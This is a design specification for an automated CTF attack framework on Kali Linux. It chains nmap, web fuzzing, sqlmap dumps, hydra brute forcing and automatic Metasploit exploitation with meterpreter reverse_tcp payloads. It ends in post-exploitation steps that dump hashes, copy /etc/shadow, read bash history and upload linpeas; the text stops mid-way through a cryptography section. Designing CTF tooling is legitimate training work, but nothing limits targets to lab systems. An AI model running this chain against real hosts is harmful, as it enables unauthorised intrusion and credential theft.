==============================================================
TOOL NAME: <TOOLNAME> (replace with your chosen name)
TAGLINE: "Full-Cycle CTF Automation Framework"
PLATFORM: Kali Linux (native tools only)
TYPE: Logic-driven CLI orchestration engine — ZERO AI
==============================================================

==============================================================
SECTION 1: STARTUP SEQUENCE AND BANNER
==============================================================

On launch, display ASCII art of the tool name.
Below banner display:
  - Tagline
  - Version number
  - "Kali Linux Native | CTF Automation Framework"
  - Current date and time

LOADING SEQUENCE (Metasploit-style, animated):
Each line animates with a spinner (| / - \ cycling at 80ms):

  [*] Booting core engine................
  [*] Loading category modules...........
  [*] Verifying installed tools...........
  [*] Mounting wordlists..................
  [*] Initializing pivot engine...........
  [*] CVE database connector ready........
  [*] Shell manager online................
  [+] All systems ready. Welcome to <TOOLNAME>.

DEPENDENCY CHECK (runs silently during loading):
Check presence of each tool using: shutil.which(<tool>)

Full tool list to verify:
  RECON:     nmap, ping, curl, wget
  WEB:       ffuf, gobuster, dirsearch, feroxbuster, dirb,
             sqlmap, dalfox, nuclei, wfuzz, nikto,
             whatweb, wafw00f
  PWN:       msfconsole, msfvenom, searchsploit, hydra,
             netcat, ssh, ftp, smbclient, enum4linux,
             rpcclient, linpeas, pspy
  REVERSE:   strings, file, ltrace, strace, gdb, radare2,
             ghidra, objdump, readelf
  FORENSICS: binwalk, exiftool, foremost, bulk_extractor,
             volatility3, stegseek, zsteg, steghide, xxd
  CRYPTO:    base64, xortool, john, hashcat, hashid,
             openssl, python3
  OSINT:     theHarvester, dnsenum, whois
  UTILS:     searchsploit, find, grep, awk, sed, python3

If tool missing: add to MISSING_TOOLS[]
After all checks:
  Print: [+] Tools available: <count>
  Print: [!] Tools missing: <MISSING_TOOLS joined by comma>
  Print: [*] Missing tools will be skipped automatically.

==============================================================
SECTION 2: USER INPUT FLOW
==============================================================

STEP 1 — CATEGORY SELECTION:
Display this menu exactly:

  ╔══════════════════════════════════════╗
  ║   SELECT CATEGORY                    ║
  ╠══════════════════════════════════════╣
  ║  1. Web Exploitation                 ║
  ║  2. Network / Boot2Root (Full PWN)   ║
  ║  3. Reverse Engineering              ║
  ║  4. Digital Forensics                ║
  ║  5. OSINT                            ║
  ║  6. Cryptography                     ║
  ║  7. Auto-Detect (Pivot Engine)       ║
  ╚══════════════════════════════════════╝

Accept input: 1 through 7 only.
On invalid input: print [!] Invalid option. Try again.
Loop until valid input received.

──────────────────────────────────────────
STEP 2 — TARGET INPUT:
──────────────────────────────────────────

IF category is 1 or 2:
  Prompt: "Enter target IP address:"
  Validate: must match regex ^\d{1,3}(\.\d{1,3}){3}$
  On invalid: print [!] Invalid IP format. Re-prompt.
  Also prompt: "Enter specific port to focus on
               (or press Enter to scan all ports):"
  If Enter pressed: PORT = None (nmap scans all ports)
  If number entered: PORT = that number

IF category is 3, 4, or 6:
  Prompt: "Enter full path to target file:"
  Check: file must exist at that path.
  On missing: print [!] File not found. Re-prompt.

IF category is 5:
  Prompt: "Enter target domain, username, or organization:"
  Accept any non-empty string.

IF category is 7:
  Prompt: "Enter IP address or file path:"
  Accept any non-empty string.
  Pivot Engine will determine routing automatically.

──────────────────────────────────────────
STEP 3 — FLAG FORMAT INPUT:
──────────────────────────────────────────

Prompt:
  "Enter flag prefix (e.g. THM{ or HTB{ or just THM).
   Press Enter to scan for all common formats:"

LOGIC:
  If user enters nothing (just Enter):
    Use all default patterns:
      HTB\{[^}]+\}
      THM\{[^}]+\}
      CTF\{[^}]+\}
      FLAG\{[^}]+\}
      flag\{[^}]+\}
      picoCTF\{[^}]+\}
    Store all in FLAG_PATTERNS[] list.

  If user enters a prefix (e.g. "THM{" or "THM"):
    Strip all whitespace from input.
    If input does not end with "{": append "{"
    Escape the prefix for regex use.
    Build pattern: <escaped_prefix>[^}]+\}
    Example: "THM" → "THM{" → THM\{[^}]+\}
    Example: "HTB{" → HTB\{[^}]+\}
    Store single pattern in FLAG_PATTERNS[].

  FLAG_PATTERNS[] is used everywhere across all modules.
  After every single tool execution:
    Run flag_scan() on that tool's output immediately.
    Do not wait for a phase or module to complete.

──────────────────────────────────────────
STEP 4 — ATTACK MODE:
──────────────────────────────────────────

Prompt:
  "Select attack mode:
   1. Stealth    (slower, fewer requests)
   2. Normal     (balanced — recommended)
   3. Aggressive (fast, maximum coverage)
  Enter choice [default: 2]:"

If Enter with no input: use 2.
Store as ATTACK_MODE.

ATTACK_MODE affects:
  Thread counts in ffuf, gobuster, feroxbuster
  Timing flags in nmap (-T2, -T4, -T5)
  Hydra parallel tasks (-t 4, -t 16, -t 32)

──────────────────────────────────────────
STEP 5 — CONFIRM AND LAUNCH:
──────────────────────────────────────────

Print summary:
  Target      : <value>
  Category    : <category name>
  Flag format : <pattern(s)>
  Mode        : <Stealth / Normal / Aggressive>

Prompt: "Launch? [Y/n]:"
Y or Enter → begin execution.
n → print "Aborted." and exit cleanly.

==============================================================
SECTION 3: NMAP SCANNING (USED ACROSS ALL MODULES)
==============================================================

nmap is the ONLY port scanner used in this tool.
No other scanner is used at any point.

──────────────────────────────────────────
SCAN STEP 1 — FAST DISCOVERY:
──────────────────────────────────────────

IF PORT = None:
  IF ATTACK_MODE = 1: Run: nmap -T2 --open <target>
  IF ATTACK_MODE = 2: Run: nmap -T4 --open <target>
  IF ATTACK_MODE = 3: Run: nmap -T5 --open <target>

IF PORT = specific number:
  Run: nmap -T4 --open -p <PORT> <target>

Parse output:
  Extract every line containing "open"
  For each: extract port number (integer) and service name
  Store: OPEN_PORTS[] and PORT_SERVICE_MAP{port: service}
  Print each: [+] Open port: <port> — <service>

If OPEN_PORTS is empty after this scan:
  Print: [!] No open ports found. Aborting.
  Exit module.

──────────────────────────────────────────
SCAN STEP 2 — DEEP SERVICE SCAN:
──────────────────────────────────────────

Run: nmap -sV -sC -O --open
          -p <OPEN_PORTS joined by comma> <target>

Parse output:
  For each port line: extract service name and full version
  Update PORT_SERVICE_MAP{port: {service, version}}
  Extract OS detection guess → store as OS_GUESS
  Extract NSE script output:
    http-title      → store as WEB_TITLE
    smb-security-mode → store in SMB_INFO
    ssh-hostkey     → store in SSH_INFO
    Any credentials or hashes in script output →
      call store_cred() or store_hash() immediately

  Print: [+] Port <port>/tcp — <service> <version>
  If OS found: print [+] OS guess: <os string>

──────────────────────────────────────────
SCAN STEP 3 — FULL PORT SCAN (PWN only):
──────────────────────────────────────────

CONDITION: Only run in Network/PWN module (category 2).

Run: nmap -p- -T4 --open --min-rate 1000 <target>

Parse: same as Scan Step 1.
Merge newly found ports into OPEN_PORTS[].
Run Scan Step 2 again on newly discovered ports only.

──────────────────────────────────────────
AFTER ALL NMAP SCANS — SET SERVICE FLAGS:
──────────────────────────────────────────

Check OPEN_PORTS and set boolean flags:
  If 80, 443, 8080, or 8443 in OPEN_PORTS: WEB_DETECTED = true
  If 445 or 139 in OPEN_PORTS:             SMB_DETECTED = true
  If 22 in OPEN_PORTS:                     SSH_DETECTED = true
  If 21 in OPEN_PORTS:                     FTP_DETECTED = true
  If 3306 in OPEN_PORTS:                   MYSQL_DETECTED = true
  If 5432 in OPEN_PORTS:                   PSQL_DETECTED = true
  If 6379 in OPEN_PORTS:                   REDIS_DETECTED = true
  If 27017 in OPEN_PORTS:                  MONGO_DETECTED = true
  If 111 or 2049 in OPEN_PORTS:            NFS_DETECTED = true

These flags control which sub-modules activate.
Run flag_scan() on all nmap output before continuing.

==============================================================
SECTION 4: WEB EXPLOITATION MODULE
==============================================================

TRIGGER: Category = 1, or WEB_DETECTED = true in any module.
INPUT: target IP, OPEN_PORTS, PORT_SERVICE_MAP from nmap.

For each web port in OPEN_PORTS (80, 443, 8080, 8443):
  If port is 443 or 8443: BASE_URL = https://<target>:<port>
  Else:                   BASE_URL = http://<target>:<port>

──────────────────────────────────────────
PHASE 1 — TECHNOLOGY AND WAF DETECTION:
──────────────────────────────────────────

Run: whatweb <BASE_URL> 2>/dev/null
Parse: extract server name, CMS, framework, headers
Store in TECH_STACK[]
Print: [+] Tech detected: <item>

Run: wafw00f <BASE_URL> 2>/dev/null
Parse:
  If "is behind" in output:
    WAF_DETECTED = true
    Store WAF name
    Print: [!] WAF detected: <name>
  Else:
    WAF_DETECTED = false
    Print: [-] No WAF detected

Run: curl -s -I <BASE_URL>
Parse response headers:
  Extract: Server, X-Powered-By, Content-Type,
           Set-Cookie, Location, WWW-Authenticate
  Print any interesting values:
    [+] Header: <name>: <value>

Run flag_scan() on all output from this phase.

──────────────────────────────────────────
PHASE 2 — DIRECTORY AND FILE DISCOVERY:
──────────────────────────────────────────

Set thread count based on ATTACK_MODE:
  ATTACK_MODE 1: threads = 20
  ATTACK_MODE 2: threads = 40
  ATTACK_MODE 3: threads = 80

Run all available tools. Skip any in MISSING_TOOLS[].
Merge all results into FOUND_PATHS{path: status_code}.
Deduplicate across all tools.

TOOL 1 — ffuf:
  Run: ffuf -u <BASE_URL>/FUZZ
            -w /usr/share/wordlists/dirb/common.txt
            -mc 200,204,301,302,307,401,403
            -t <threads> -s 2>/dev/null
  Parse each line: extract path and status code.

TOOL 2 — gobuster:
  Run: gobuster dir -u <BASE_URL>
                    -w /usr/share/wordlists/dirb/common.txt
                    -t <threads> -q --no-error 2>/dev/null
  Parse each result line: extract path and status code.

TOOL 3 — feroxbuster:
  Run: feroxbuster -u <BASE_URL>
                   -w /usr/share/wordlists/dirb/common.txt
                   --silent --no-state 2>/dev/null
  Parse results.

TOOL 4 — dirsearch:
  Run: dirsearch -u <BASE_URL> -q 2>/dev/null
  Parse results.

FALLBACK — dirb (if all four above are missing):
  Run: dirb <BASE_URL>
            /usr/share/wordlists/dirb/common.txt -S
  Parse results.

After all tools:
  Print each unique path:
    [+] Found: <path> (Status: <code>)
  Run flag_scan() on all path strings and responses.

──────────────────────────────────────────
PHASE 3 — VULNERABILITY SCANNING:
──────────────────────────────────────────

Run: nikto -h <BASE_URL>
           -output /tmp/nikto_<port>.txt -Format txt
Parse /tmp/nikto_<port>.txt after completion:
  Extract lines containing any of:
    vulnerability, OSVDB, injection, XSS, traversal,
    disclosure, default password, outdated, dangerous, SQL
  Print each: [!] Nikto: <line>
  Store in VULN_FINDINGS[]

Run: nuclei -u <BASE_URL>
            -s medium,high,critical -silent 2>/dev/null
Parse each output line:
  Extract: severity, template name, matched URL
  Print: [!] Nuclei [<severity>]: <template> → <url>
  Store in VULN_FINDINGS[]

Run flag_scan() on all output from this phase.

──────────────────────────────────────────
PHASE 4 — INJECTION TESTING:
──────────────────────────────────────────

CONDITION: Only run this phase if at least one is true:
  - FOUND_PATHS contains .php, .asp, or .aspx files
  - FOUND_PATHS contains: login, admin, search, user, query
  - Any path in FOUND_PATHS contains "?" character
  - Page content or WEB_TITLE contains "login" or "form"

SQL INJECTION — sqlmap:
  Target URL = most relevant path from FOUND_PATHS,
               or BASE_URL if no specific path identified.

  IF WAF_DETECTED = false:
    Run: sqlmap -u "<target_url>" --forms
                --batch --level=2 --risk=2
                --dbs --output-dir=/tmp/sqlmap_out -q

  IF WAF_DETECTED = true:
    Run: sqlmap -u "<target_url>" --forms
                --batch --level=2 --risk=2
                --tamper=space2comment,between
                --dbs --output-dir=/tmp/sqlmap_out -q

  Parse output:
    If "is vulnerable" in output:
      Extract: parameter name, database type, database names
      Run sqlmap again with --dump to extract table data.
      Store in SQLI_FINDINGS[]
      Print: [+] SQLi confirmed: <parameter> | DB: <name>
      Print: [+] Dumped data saved to /tmp/sqlmap_out/
    Else:
      Print: [-] No SQLi detected

XSS TESTING — dalfox:
  For each path in FOUND_PATHS with status 200:
    Run: dalfox url "<BASE_URL><path>" --silence 2>/dev/null
    Parse: if "POC" or "FOUND" in output:
      Extract payload and parameter
      Store in VULN_FINDINGS[]
      Print: [+] XSS found: <parameter> at <path>

PARAMETER FUZZING — wfuzz:
  CONDITION: any path in FOUND_PATHS contains "?"
             OR .php files found:
  Run: wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt
             --hc 404 <BASE_URL>/FUZZ 2>/dev/null
  Parse: extract all non-404 hits.
  Print: [+] Fuzz result: <path> (Status: <code>)

Run flag_scan() on all output from this phase.

──────────────────────────────────────────
PHASE 5 — CVE LOOKUP AND EXPLOIT MATCHING:
──────────────────────────────────────────

For each entry in PORT_SERVICE_MAP where version is known:
  SERVICE = service name string
  VERSION = version string
  QUERY   = SERVICE + " " + VERSION (URL-encode for requests)

  STEP A — NVD API (requires internet):
  Fetch using requests library:
    URL: https://services.nvd.nist.gov/rest/json/cves/2.0
         ?keywordSearch=<QUERY>&cvssV3Severity=HIGH

  Parse JSON response:
    Path: vulnerabilities[] → cve → id
    Path: vulnerabilities[] → cve → metrics →
          cvssMetricV31[] → cvssData → baseScore
    Path: vulnerabilities[] → cve → descriptions[] →
          where lang="en" → value

    For each CVE where baseScore >= 6.0:
      Store in CVE_MAP{port: [{id, score, description}]}
      Print: [+] CVE: <id> | CVSS: <score>
             | <first 100 chars of description>

  If fetch fails or no internet:
    Log failure silently. Continue to Step B.

  STEP B — searchsploit (offline, always run):
  Run: searchsploit "<SERVICE> <VERSION>" --json 2>/dev/null
  Parse JSON response:
    Extract EXPLOITS[] array
    For each: get Title and Path fields
    Store in EXPLOIT_SUGGESTIONS[]
    Print: [+] Exploit: <title> → <path>

  If nothing found from either source:
    Print: [-] No CVEs or exploits found for <SERVICE> <VERSION>

──────────────────────────────────────────
PHASE 6 — METASPLOIT AUTOMATION:
──────────────────────────────────────────

CONDITION: Run this phase only if:
  CVE_MAP has at least one entry, OR
  VULN_FINDINGS contains high or critical severity items.

STEP A — FIND METASPLOIT MODULE:
For each CVE in CVE_MAP:
  Run: msfconsole -q -x "search <CVE_ID>; exit" 2>/dev/null
  Parse output:
    If any result row appears (line has index number):
      Extract module path from first result row
      Store: MSF_MODULES{cve_id: module_path}
      Print: [+] Metasploit module found: <module_path>

STEP B — AUTO-EXPLOIT:
CONDITION: MSF_MODULES is not empty.

For each module in MSF_MODULES:
  Determine payload from OS_GUESS:
    If OS_GUESS contains "Windows":
      PAYLOAD = windows/x64/meterpreter/reverse_tcp
    Else:
      PAYLOAD = linux/x86/meterpreter/reverse_tcp

  Write resource script to /tmp/<toolname>_msf_<timestamp>.rc:
    use <module_path>
    set RHOSTS <target>
    set RPORT <port>
    set LHOST <LOCAL_IP>
    set LPORT 4444
    set PAYLOAD <PAYLOAD>
    set ExitOnSession false
    exploit -j
    sleep 10
    sessions -l

  Run: msfconsole -q -r /tmp/<toolname>_msf_<timestamp>.rc
  Monitor stdout:
    If "Meterpreter session" appears:
      Print: [+] METERPRETER SESSION OPENED
      SHELL_ACCESS = true
      SHELL_TYPE = "meterpreter"
      Call POST-EXPLOITATION module immediately.
    If "Command shell session" appears:
      Print: [+] COMMAND SHELL SESSION OPENED
      SHELL_ACCESS = true
      SHELL_TYPE = "shell"
      Call POST-EXPLOITATION module immediately.

STEP C — PAYLOAD GENERATION (fallback):
CONDITION: SHELL_ACCESS = false after all attempts.

  Run: msfvenom -p <PAYLOAD>
                LHOST=<LOCAL_IP> LPORT=4444
                -f elf -o /tmp/<toolname>_payload.elf 2>/dev/null
  Print: [*] Payload saved: /tmp/<toolname>_payload.elf
  Print: [*] Start listener manually:
         msfconsole -q -x
         "use exploit/multi/handler;
          set PAYLOAD <PAYLOAD>;
          set LHOST <LOCAL_IP>;
          set LPORT 4444; run"

Run flag_scan() on all output from this phase.

==============================================================
SECTION 5: NETWORK / BOOT2ROOT (FULL PWN) MODULE
==============================================================

TRIGGER: Category = 2.
INPUT: target IP.

Run nmap Scan Steps 1, 2, and 3 (all three).
Then activate service modules based on detected flags.

──────────────────────────────────────────
PORT 21 — FTP:
──────────────────────────────────────────
CONDITION: FTP_DETECTED = true

Attempt anonymous login:
  Connect via ftp -n <target>
  Send: USER anonymous then PASS anonymous
  If "230" in response:
    Print: [+] FTP Anonymous login: SUCCESS
    Run: ls -la and mget * to /tmp/ftp_files/
    Print: [+] Files retrieved: <list>
    Run flag_scan() on all retrieved file contents.

If anonymous fails:
  Run: hydra -l admin
             -P /usr/share/wordlists/rockyou.txt
             ftp://<target> -t 4 2>/dev/null
  Parse: extract "login:" and "password:" from output
  If found: call store_cred()

──────────────────────────────────────────
PORT 22 — SSH:
──────────────────────────────────────────
CONDITION: SSH_DETECTED = true

IF CREDENTIALS[] is not empty:
  For each (user, pass) in CREDENTIALS[]:
    Attempt: ssh <user>@<target> with that password
    Timeout: 5 seconds per attempt
    If success:
      Store: SSH_CREDS = {user, pass}
      Print: [+] SSH LOGIN SUCCESS: <user>:<pass>
      Call POST-EXPLOITATION module immediately.

IF CREDENTIALS[] is empty:
  Run: hydra -L /usr/share/wordlists/metasploit/unix_users.txt
             -P /usr/share/wordlists/rockyou.txt
             ssh://<target> -t 4 -q 2>/dev/null
  Parse: extract successful login pairs
  If found: call store_cred(), then attempt SSH login above.

──────────────────────────────────────────
PORT 23 — TELNET:
──────────────────────────────────────────
CONDITION: 23 in OPEN_PORTS

Run: nc <target> 23 with timeout 5
Try default credentials: admin:admin, root:root, admin:password
If connected and login prompt appears:
  Try each pair.
  If success: SHELL_ACCESS = true, call POST-EXPLOITATION.
  Print: [+] Telnet login success: <user>:<pass>

──────────────────────────────────────────
PORT 25 — SMTP:
──────────────────────────────────────────
CONDITION: 25 in OPEN_PORTS

Run: nc <target> 25 with timeout 5
Send: EHLO test
Send: VRFY root
Send: EXPN admin
Parse responses: extract valid usernames (code 250 or 252)
Store usernames for use in credential brute forcing.
Print: [+] SMTP user enumerated: <username>

──────────────────────────────────────────
PORT 80/443/8080/8443 — HTTP IN PWN MODE:
──────────────────────────────────────────
CONDITION: WEB_DETECTED = true

Call the full Web Exploitation module (Section 4)
as a sub-module. All findings feed into PWN report.

──────────────────────────────────────────
PORT 139/445 — SMB:
──────────────────────────────────────────
CONDITION: SMB_DETECTED = true

Run: enum4linux -a <target> > /tmp/enum4linux_out.txt
Parse /tmp/enum4linux_out.txt:
  Extract: usernames → SMB_USERS[]
  Extract: share names → SMB_SHARES[]
  Extract: OS info, password policy, domain name
  Print: [+] SMB Users: <list>
  Print: [+] SMB Shares: <list>

For each share in SMB_SHARES:
  Try null session:
    Run: smbclient //<target>/<share> -N 2>/dev/null
    If connected:
      Run: ls then mget * to /tmp/smb_<share>/
      Print: [+] SMB share readable (null): <share>
      Run flag_scan() on all file contents.

  If CREDENTIALS[] not empty:
    For each (user, pass) in CREDENTIALS[]:
      Run: smbclient //<target>/<share>
                     -U <user>%<pass> 2>/dev/null
      If connected:
        Run: ls then mget * to /tmp/smb_<share>_auth/
        Print: [+] SMB share readable (auth): <share>
        Run flag_scan() on all file contents.

Run flag_scan() on enum4linux output.

──────────────────────────────────────────
PORT 111/2049 — NFS:
──────────────────────────────────────────
CONDITION: NFS_DETECTED = true

Run: showmount -e <target>
Parse: extract exported paths
For each path:
  Run: mount -t nfs <target>:<path> /mnt/nfs_tmp
  List contents: ls -laR /mnt/nfs_tmp
  Run flag_scan() on all listed content.
  Print: [+] NFS mount accessible: <path>
  Unmount after: umount /mnt/nfs_tmp

──────────────────────────────────────────
PORT 3306 — MYSQL:
──────────────────────────────────────────
CONDITION: MYSQL_DETECTED = true

Run: mysql -h <target> -u root --password=""
           -e "show databases;" 2>/dev/null
If connects:
  Print: [+] MySQL open with no password
  Enumerate all databases and tables.
  Run flag_scan() on all output.

──────────────────────────────────────────
PORT 5432 — POSTGRESQL:
──────────────────────────────────────────
CONDITION: PSQL_DETECTED = true

Run: psql -h <target> -U postgres
          -c "\list" 2>/dev/null
If connects:
  Print: [+] PostgreSQL accessible
  Enumerate databases.
  Run flag_scan() on output.

──────────────────────────────────────────
PORT 6379 — REDIS:
──────────────────────────────────────────
CONDITION: REDIS_DETECTED = true

Run: redis-cli -h <target> ping
If "PONG" in response:
  Run: redis-cli -h <target> keys *
  Dump all key values.
  Print: [+] Redis open: <key count> keys found
  Run flag_scan() on all key values.

──────────────────────────────────────────
PORT 27017 — MONGODB:
──────────────────────────────────────────
CONDITION: MONGO_DETECTED = true

Run: mongo <target>:27017
          --eval "db.adminCommand('listDatabases')"
          2>/dev/null
If connects:
  Print: [+] MongoDB open with no auth
  Enumerate collections.
  Run flag_scan() on output.

──────────────────────────────────────────
CREDENTIAL REUSE (runs after all service modules):
──────────────────────────────────────────

For every (user, pass) in CREDENTIALS[]:
  If SSH_DETECTED:   try ssh login
  If FTP_DETECTED:   try ftp login
  If SMB_DETECTED:   try smbclient
  If MYSQL_DETECTED: try mysql login
  Print: [+] Credential valid on <service>: <user>:<pass>

──────────────────────────────────────────
CVE LOOKUP AND METASPLOIT:
──────────────────────────────────────────

Run Phase 5 and Phase 6 from Web module (Section 4)
against all services in PORT_SERVICE_MAP.
Same logic. Same output format.

==============================================================
SECTION 6: POST-EXPLOITATION MODULE
==============================================================

TRIGGER: SHELL_ACCESS = true (any shell type)

──────────────────────────────────────────
IF SHELL_TYPE = "meterpreter":
──────────────────────────────────────────

Write resource script /tmp/<toolname>_post_<timestamp>.rc:
  sysinfo
  getuid
  getsystem
  hashdump
  run post/multi/recon/local_exploit_suggester
  run post/linux/gather/enum_system
  download /etc/passwd /tmp/
  download /etc/shadow /tmp/
  search -f *.txt
  search -f flag*
  search -f user.txt
  search -f root.txt

Run: msfconsole -q -r /tmp/<toolname>_post_<timestamp>.rc
Parse all output:
  Extract hashes from hashdump → call store_hash() for each
  Extract any credentials → call store_cred()
  Apply FLAG_PATTERNS[] to all output
  Print: [+] Post-exploit finding: <item>

──────────────────────────────────────────
IF SHELL_TYPE = "ssh":
──────────────────────────────────────────

Run each command via:
  ssh -o StrictHostKeyChecking=no <user>@<target> "<command>"

Commands to run in order:
  id
  whoami
  uname -a
  cat /etc/passwd
  sudo -l
  crontab -l
  ls -la /home/
  ls -la /root/ (attempt, ignore permission errors)
  find / -name "*.txt" 2>/dev/null | head -50
  find / -name "flag*" 2>/dev/null
  find / -name "user.txt" 2>/dev/null
  find / -name "root.txt" 2>/dev/null
  cat /home/*/.bash_history 2>/dev/null
  ps aux

Parse all output:
  Run flag_scan() on every command's output.
  Print any flags found immediately.

──────────────────────────────────────────
LINPEAS (if available):
──────────────────────────────────────────

CONDITION: linpeas in PATH or /usr/share/peass/linpeas.sh exists

Upload to target:
  scp /usr/share/peass/linpeas.sh <user>@<target>:/tmp/

Run on target:
  ssh <user>@<target> "chmod +x /tmp/linpeas.sh &&
                       /tmp/linpeas.sh 2>/dev/null"

Parse output:
  Extract lines with these keywords:
    SUID, writable, sudo, cron, password, credential,
    kernel, CVE, interesting, readable
  Print: [!] LinPEAS: <finding>
  Run flag_scan() on full output.

──────────────────────────────────────────
PSPY (if available):
──────────────────────────────────────────

CONDITION: pspy64 in PATH or /usr/share/peass/ exists

Upload and run for 30 seconds:
  scp <pspy_path> <user>@<target>:/tmp/
  ssh <user>@<target> "chmod +x /tmp/pspy64 &&
                       timeout 30 /tmp/pspy64 2>/dev/null"

Parse output:
  Extract lines showing processes running as root (UID=0)
  Extract cron job executions
  Print: [!] pspy: <process> running as root

Run flag_scan() on all post-exploitation output.

==============================================================
SECTION 7: REVERSE ENGINEERING MODULE
==============================================================

TRIGGER: Category = 3 or Pivot detects ELF/PE/script file.
INPUT: file path stored as FILE_PATH.

──────────────────────────────────────────
STEP 1 — FILE IDENTIFICATION:
──────────────────────────────────────────

Run: file <FILE_PATH>
Run: readelf -h <FILE_PATH> 2>/dev/null
Parse:
  Extract: architecture (x86, x64, ARM)
  Extract: linked libraries
  Extract: stripped or not stripped
  Print: [+] File type: <type>
  Print: [+] Architecture: <arch>
  Print: [+] Stripped: yes/no

──────────────────────────────────────────
STEP 2 — STRING EXTRACTION:
──────────────────────────────────────────

Run: strings <FILE_PATH> > /tmp/strings_out.txt
Parse /tmp/strings_out.txt:
  Run flag_scan() immediately on full output.
  Extract lines containing:
    http, ftp, password, pass, key, secret,
    /etc/, /home/, strcmp, flag
  Print: [+] Interesting string: <value>

──────────────────────────────────────────
STEP 3 — DYNAMIC ANALYSIS:
──────────────────────────────────────────

Run: ltrace ./<FILE_PATH> 2>&1 | tee /tmp/ltrace_out.txt
Parse:
  Extract all strcmp() and strncmp() calls
  For each: extract both arguments being compared
  Print: [+] strcmp: comparing "<arg1>" with "<arg2>"
  These often reveal expected passwords or inputs.
  Run flag_scan() on output.

Run: strace ./<FILE_PATH> 2>&1 | tee /tmp/strace_out.txt
Parse:
  Extract open(), read(), write(), connect() syscalls
  Print file paths being accessed
  Print network destinations if connect() found
  Run flag_scan() on output.

──────────────────────────────────────────
STEP 4 — STATIC DISASSEMBLY:
──────────────────────────────────────────

Run: objdump -d <FILE_PATH>
     > /tmp/objdump_out.txt 2>/dev/null
Parse:
  Extract function names from symbol table
  Extract main() function disassembly (first 50 lines)
  Print: [+] Functions found: <list>
  Print: [*] Full disassembly: /tmp/objdump_out.txt

Run: radare2 -A -q -c "afl; pdf @ main" <FILE_PATH>
     2>/dev/null
Parse:
  Extract function list from afl output
  Extract main function assembly
  Run flag_scan() on output.

──────────────────────────────────────────
STEP 5 — GDB AUTOMATED SESSION:
──────────────────────────────────────────

Write GDB script to /tmp/<toolname>_gdb.script:
  set pagination off
  break main
  run
  info registers
  x/50i $pc
  continue
  quit

Run: gdb -batch -x /tmp/<toolname>_gdb.script
         ./<FILE_PATH> 2>/dev/null
Parse:
  Extract register values at breakpoint
  Run flag_scan() on full output.

──────────────────────────────────────────
STEP 6 — GHIDRA HEADLESS (if available):
──────────────────────────────────────────

CONDITION: ghidra headless analyzer available in PATH.

Run: analyzeHeadless /tmp/ghidra_proj TEMP
     -import <FILE_PATH>
     -postScript DecompileAllFunctions.java
     -deleteProject 2>/dev/null

Parse decompiled output:
  Run flag_scan() on full decompiled C code.
  Print: [*] Ghidra output: /tmp/ghidra_out.txt

Run flag_scan() on ALL collected output from this module.

==============================================================
SECTION 8: DIGITAL FORENSICS MODULE
==============================================================

TRIGGER: Category = 4 or Pivot detects image/archive/pcap.
INPUT: FILE_PATH.

──────────────────────────────────────────
STEP 1 — FILE ID AND METADATA:
──────────────────────────────────────────

Run: file <FILE_PATH>
Run: exiftool <FILE_PATH>
Parse all exiftool output fields:
  Extract every key-value pair
  Run flag_scan() on every field value
  Print: [+] Metadata: <key> = <value>

──────────────────────────────────────────
STEP 2 — EMBEDDED DATA EXTRACTION:
──────────────────────────────────────────

Run: binwalk <FILE_PATH>
Parse: check for any embedded file signatures
If embedded files detected:
  Run: binwalk -e <FILE_PATH>
               --directory=/tmp/binwalk_out/ -q
  List extracted files.
  Print: [+] Binwalk extracted: <filename>
  For each extracted file: call Pivot Engine on it.

Run: foremost -i <FILE_PATH>
              -o /tmp/foremost_out/ -q
List recovered files.
Print: [+] Foremost recovered: <filename>
For each recovered file: call Pivot Engine on it.

Run: bulk_extractor <FILE_PATH>
                    -o /tmp/bulk_out/ -q 2>/dev/null
Parse output reports:
  Extract emails, URLs, credit card patterns, phone numbers
  Run flag_scan() on all extracted data.

──────────────────────────────────────────
STEP 3 — STEGANOGRAPHY:
──────────────────────────────────────────

CONDITION: file type contains "image" or extension is
           .jpg, .jpeg, .png, .bmp, .gif

TOOL 1 — stegseek:
  Run: stegseek <FILE_PATH>
                /usr/share/wordlists/rockyou.txt
                --output /tmp/steg_out.txt 2>/dev/null
  If extracted: run flag_scan() on /tmp/steg_out.txt
  Print: [+] Stegseek extracted data

TOOL 2 — steghide:
  Try passwords in order: "", "password", "steghide",
                           "ctf", "flag", "secret"
  For each:
    Run: steghide extract -sf <FILE_PATH>
                          -p "<password>" -f -q 2>/dev/null
    If success:
      Print: [+] Steghide extracted with password: <password>
      Run flag_scan() on extracted file content.
      Break — stop trying more passwords.

TOOL 3 — zsteg (PNG and BMP only):
  Run: zsteg <FILE_PATH> --all 2>/dev/null
  Parse every output line.
  Run flag_scan() on all output.
  Print: [+] zsteg: <channel> → <value>

──────────────────────────────────────────
STEP 4 — ARCHIVE CRACKING:
──────────────────────────────────────────

CONDITION: file type contains "Zip", "gzip", "bzip2",
           "RAR", or "7-zip"

Attempt extraction with no password first.
If password protected:
  Run: zip2john <FILE_PATH> > /tmp/zip_hash.txt 2>/dev/null
  Run: john /tmp/zip_hash.txt
            --wordlist=/usr/share/wordlists/rockyou.txt
  Parse john output:
    If cracked: extract password
    Print: [+] Archive password: <password>
    Re-extract archive with found password.
    Run flag_scan() on all extracted contents.

──────────────────────────────────────────
STEP 5 — MEMORY FORENSICS:
──────────────────────────────────────────

CONDITION: extension is .vmem, .mem, .raw, or .dmp

Run: volatility3 -f <FILE_PATH> windows.info 2>/dev/null
If Linux dump: volatility3 -f <FILE_PATH> linux.info
Parse: extract OS, architecture

Then run in order:
  volatility3 -f <FILE_PATH> windows.pslist
  volatility3 -f <FILE_PATH> windows.cmdline
  volatility3 -f <FILE_PATH> windows.filescan
              | grep -i "flag\|secret\|pass"
  volatility3 -f <FILE_PATH> windows.hashdump

Parse all output:
  Run flag_scan() on every command's output.
  Extract hashes → call store_hash() for each.
  Print: [+] Volatility finding: <item>

Run flag_scan() on ALL collected output from this module.

==============================================================
SECTION 9: CRYPTOGRAPHY MODULE
==============================================================

TRIGGER: Category = 6 or Pivot detects encoded/hashed content.
INPUT: FILE_PATH or extracted string passed as RAW_CONTENT.

──────────────────────────────────────────
STEP 1 — READ AND IDENTIFY:
──────────────────────────────────────────

Run: cat <FILE_PATH>
Store full content as RAW_CONTENT string.

Run: hashid "<RAW_CONTENT>" 2>/dev/null
Parse: extract identified hash type(s)
If hash type found:
  Print: [+] Hash type detected: <type>
  Queue for cracking in Step 3.

──────────────────────────────────────────
STEP 2 — ENCODING DETECTION AND DECODE:
──────────────────────────────────────────

Check RAW_CONTENT against each pattern. Run in this order.
After each successful decode: run flag_scan() on result.
